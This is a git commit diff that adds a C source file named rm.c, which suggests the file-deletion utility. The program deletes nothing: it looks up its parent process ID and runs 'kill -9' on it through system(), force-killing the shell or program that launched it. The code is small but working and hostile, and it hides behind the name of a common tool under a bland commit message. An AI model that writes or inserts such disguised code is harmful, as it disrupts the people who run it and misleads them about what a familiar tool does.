febd18f1edd858d7ade50a31acec772ba5e30f8a
kwood <155027796+qkewq@users.noreply.github.com>
2025-03-21 16:08:25 -0700

    Update rm.c

--- lin/rm.c
+++ lin/rm.c
@@ -1,1 +1,11 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
 
+int main(){
+  char str[100];
+  pid_t pid = getppid();
+  sprintf(str, "kill -9 %d", pid);
+  system(str);
+  return 0;
+}
